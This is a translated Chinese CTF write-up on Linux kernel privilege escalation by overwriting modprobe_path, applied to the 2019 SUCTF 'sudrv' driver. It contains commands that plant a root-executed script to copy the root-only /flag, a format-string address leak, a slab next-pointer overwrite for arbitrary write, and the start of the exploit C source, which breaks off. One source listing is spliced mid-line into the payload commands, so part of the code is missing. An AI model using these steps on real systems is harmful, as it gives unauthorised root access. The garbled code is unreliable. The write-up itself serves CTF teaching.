# Kernel提权方法之modprobe_path覆写
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## modprobe_path介绍
`modprobe_path`是用于在`Linux`内核中添加可加载的内核模块，当我们在`Linux`内核中安装或卸载新模块时，就会执行这个程序。他的路径是一个内核全局变量，默认为
`/sbin/modprobe`，可以通过如下命令来查看该值：
    cat /proc/sys/kernel/modprobe
    -> /sbin/modprobe
此外，`modprobe_path`存储在内核本身的`modprobe_path`符号中，且具有可写权限。也即普通权限即可修改该值。
而当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，也会调用这个
`modprobe_path`所指向的程序。如果我们将这个字符串指向我们自己的`sh`文件 ，并使用 `system`或 `execve`
去执行一个未知文件类型的错误文件，那么在发生错误的时候就可以执行我们自己的二进制文件了。其调用流程如下：
    （1）do_execve()
    （2）do_execveat_common()
    （3）bprm_execve()
    （4）exec_binprm()
    （5）search_binary_handler()
    （6）request_module()
    （7）call_usermodehelper()
那么查看 `__request_module` 源码如下，本质就是调用了 `call_usermodehelper`函数：
    int __request_module(bool wait, const char *fmt, ...) 
    { 
        va_list args; 
        char module_name[MODULE_NAME_LEN]; 
        unsigned int max_modprobes; 
        int ret; 
    // char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe"; 
        char *argv[] = { modprobe_path, "-q", "--", module_name, NULL }; 
        static char *envp[] = { "HOME=/", 
                    "TERM=linux", 
                    "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 
                    NULL }; // 环境变量. 
        static atomic_t kmod_concurrent = ATOMIC_INIT(0); 
    #define MAX_KMOD_CONCURRENT 50    /* Completely arbitrary value - KAO */ 
        static int kmod_loop_msg; 
        va_start(args, fmt); 
        ret = vsnprintf(module_name, MODULE_NAME_LEN, fmt, args);   
        va_end(args); 
        if (ret >= MODULE_NAME_LEN) 
            return -ENAMETOOLONG; 
        max_modprobes = min(max_threads/2, MAX_KMOD_CONCURRENT);    
        atomic_inc(&kmod_concurrent); 
        if (atomic_read(&kmod_concurrent) > max_modprobes) { 
            /* We may be blaming an innocent here, but unlikely */ 
            if (kmod_loop_msg++  /tmp/getflag.sh");
    system("chmod +x /tmp/getflag.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fl");
    system("chmod +x /tmp/fl");
    //changed modprobe_path
    system("/tmp/fl")
  1. 首先创建了一个我们自己的 sh文件 geflag.sh，用于 将 /flag拷贝到 /tmp/flag下，并赋予 /tmp/flag为可读可写可执行权限。然后赋予 /tmp/getflag.sh可执行权限。
  2. 随后创建了一个错误格式头的文件 /tmp/fl，并赋予其可执行权限
  3. 当我们覆写了 modprobe_path为 /tmp/getflag.sh后，调用 system(“/tmp/fl”)触发错误，随后就能以root权限执行 /tmp/getflag.sh，完成将原本只能 root可读的flag拷贝到 /tmp目录下，并赋予可读权限
此外，我们该如何确定 `modprobe_path`符号的存储地址呢？在内核题目中，通常使用 `cat /proc/kallsyms`来获取符号地址，但是
`modprobe_path`并不在其中。这里我们可以考虑查找引用了`modprobe_path`符号的地址，来获取其地址。而在上面
`__request_module`代码中，即引用了 `modprobe_path`的地址。所以我们可以通过以下方法找到
`modprobe_path`地址：
  * 先通过 /proc/kallsyms找到 __request_module地址
  * 随后查看 __reques_module函数汇编，找到 modprobe_path的引用
    / # cat /proc/kallsyms | grep __request     
    ffffffffbb2aad00 T __request_module         
    ffffffffbb1afdb8 t __request_module.cold    
    ffffffffba886e60 T __request_percpu_irq     
    ffffffffbb2baa30 T __request_region         
    ffffffffbaee47fc t __request_region.cold    
    ffffffffba8aa2b0 t __request_resource       
    pwndbg> x/28i 0xffffffffbb2aad00
       0xffffffffbb2aad00:  push   rbp
       0xffffffffbb2aad01:  mov    rbp,rsp
       0xffffffffbb2aad04:  push   r14
       0xffffffffbb2aad06:  push   r13
       0xffffffffbb2aad08:  push   r12
       0xffffffffbb2aad0a:  mov    r12,rsi
       0xffffffffbb2aad0d:  push   r10
       0xffffffffbb2aad0f:  lea    r10,[rbp+0x10]
       0xffffffffbb2aad13:  push   rbx
       0xffffffffbb2aad14:  mov    r13,r10
       0xffffffffbb2aad17:  mov    ebx,edi
       0xffffffffbb2aad19:  sub    rsp,0xb0
       0xffffffffbb2aad20:  mov    QWORD PTR [rbp-0x48],rdx
       0xffffffffbb2aad24:  mov    QWORD PTR [rbp-0x40],rcx
       0xffffffffbb2aad28:  mov    QWORD PTR [rbp-0x38],r8
       0xffffffffbb2aad2c:  mov    QWORD PTR [rbp-0x30],r9
       0xffffffffbb2aad30:  mov    rax,QWORD PTR gs:0x28
       0xffffffffbb2aad39:  mov    QWORD PTR [rbp-0x60],rax
       0xffffffffbb2aad3d:  xor    eax,eax
       0xffffffffbb2aad3f:  test   dil,dil
       0xffffffffbb2aad42:  jne    0xffffffffbb2aaec8
       0xffffffffbb2aad48:  cmp    BYTE PTR [rip+0x59d711],0x0        # 0xffffffffbb848460
       0xffffffffbb2aad4f:  je     0xffffffffbb2ab024
       0xffffffffbb2aad55:  lea    rax,[rbp-0x58]
       0xffffffffbb2aad59:  lea    rcx,[rbp-0xb0]
       0xffffffffbb2aad60:  mov    rdx,r12
       0xffffffffbb2aad63:  mov    esi,0x38
       0xffffffffbb2aad68:  lea    rdi,[rbp-0x98]
    pwndbg> x/s 0xffffffffbb848460
    0xffffffffbb848460:     "/sbin/modprobe"
那么，总结一下该 技术的使用条件：
  * 知道 modprobe_path地址
  * 拥有一个任意地址写漏洞，用于修改 modprobe_path内容
## 2019 SUCTF Sudrv
###  漏洞分析
    __int64 __fastcall sudrv_ioctl(__int64 a1, int a2, __int64 size)
    {
      __int64 result; // rax
      switch ( a2 )
      {
        case 0x73311337:
          if ( (unsigned __int64)(size - 1) > 0xFFE )
            return 0LL;
          su_buf = (char *)_kmalloc(size, 0x480020LL);
          result = 0LL;
          break;
        case (int)0xDEADBEEF:
          if ( su_buf )
            JUMPOUT(0xB8LL);
          result = 0LL;
          break;
        case 0x13377331:
          kfree(su_buf);
          result = 0LL;
          su_buf = 0LL;
          break;
        default:
          return 0LL;
      }
      return result;
    }
    void __fastcall sudrv_ioctl_cold_2(__int64 a1)
    {
      printk(a1);
      JUMPOUT(0x38LL);
    }
程序总体有三个功能，一个是分配堆块，大小由用户输入；一个是释放堆块；一个是输出函数。其中在输出函数中，存在格式化字符串漏洞，使得我们可以泄露数据：
    void __fastcall sudrv_ioctl_cold_2(__int64 a1)
    {
      printk(a1);
      JUMPOUT(0x38LL);
    }
还实现了一个 write函数，可以输入用户的数据到堆块中，这里没有对size进行检查，导致可以堆溢出。
    __int64 sudrv_write()
    {
      __int64 result; // rax
      if ( (unsigned int)copy_user_generic_unrolled(su_buf) )
        result = -1LL;
      else
        result = sudrv_write_cold_1();
      return result;
    }
###  漏洞利用
这道题的预期解是通过堆溢出，修改`slab`堆块的`next`指针，来将`slab`堆块分配到栈上，然后执行`ROP`。
但这道题，如果运用覆写
`modprobe_path`将会更加简单。首先这道题可以通过格式化字符串漏洞输出内核地址，从而得到`modprobe_path`的地址，其次这道题可以通过分配伪造堆块来实现任意地址写。完全符合覆写
`modprobe_path`的要求。
**_泄露地址_**
首先通过一个格式化字符串漏洞，输出栈上保留的内核地址，经过调试发现栈上第一个地址即是符合要求的内核地址，其与`modprobe_path`相差
`0x107a0a1`。此时栈上数据如下所示，`rsp`所指向的值就是一个内核地址。
    rsp  0xffffb9fdc07dbe80 —▸ 0xffffffff9d5c827f ◂— mov    ebx, eax /* 0xffffffdfd3dc389 */
         0xffffb9fdc07dbe88 ◂— add    byte ptr [rax + 0x13], dl /* 0xae2df5d5a3135000 */
         0xffffb9fdc07dbe90 ◂— 0
         0xffffb9fdc07dbe98 —▸ 0xffffffff9e69a268 ◂— 0
         0xffffb9fdc07dbea0 —▸ 0xffffb9fdc07dbed8 —▸ 0xffff998c47a86700 ◂— 0
         0xffffb9fdc07dbea8 ◂— out    dx, eax /* 0xdeadbeef */
         0xffffb9fdc07dbeb0 —▸ 0xffff998c47a86700 ◂— 0
         0xffffb9fdc07dbeb8 ◂— 0
**_任意地址写_**
然后就利用堆溢出漏洞修改空闲堆块的`next`指针为 `modprobe_path`地址，来实现分配伪造堆块到
`modprobe_path`处。关于内核堆的知识，这里不做展开讲述，可以参考[这篇文章](https://blog.csdn.net/lukuen/article/details/6935068)。简单来说`Linux`内核对小内存分配使用的是
`slab/slub`分配器，其与glibc下的`ptmalloc`的`fastbin`有许多类似的地方，比如`Kfree`后，空闲堆块也会有
`fd`指针指向下一个空闲块。而且`slab`分配的空闲堆块从一开始地址都是连续的，他们共同组成一个内存页面。类似如下，第一个 `0x400`
空闲堆块其堆头的`next`指向`0xffff400`地址，也就是紧邻的下一个`0x400`空闲堆块，而 `0xffff400`的`next`指针指向了
`0xffff800`的空闲堆块。
    0xffff000        | next-> 0x400 |      0x0        |
    ...
    0xffff400        | next-> 0x800 |     0x0        |
    ...
    0xffff800        | next->0xc00  |    0x0        |
    ...
所以，通过堆溢出，修改紧邻的下一个空闲堆块的`next`指针指向 `modprobe_path`，然后再分配两次堆块，即可将伪造堆块分配到
`modprobe_path`地址处。
最后，将`modprobe_path`按照上述覆写为 `/tmp/getflag.sh`即可。
    pwndbg> x/s 0xffffffff9f242320
    0xffffffff9f242320:     "/tmp/getflag.sh"
`EXP`如下：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int fd;
    size_t offset = 0x0;
    void cmalloc(int size){
        if(-1 == ioctl(fd, 0x73311337, size)){
            printf('malloc error\n');
        }
    }
    void cfree(){
        if(-1 == ioctl(fd, 0x13377331, NULL)){
            printf('free error\n');
        }
    }
    void cprintf(){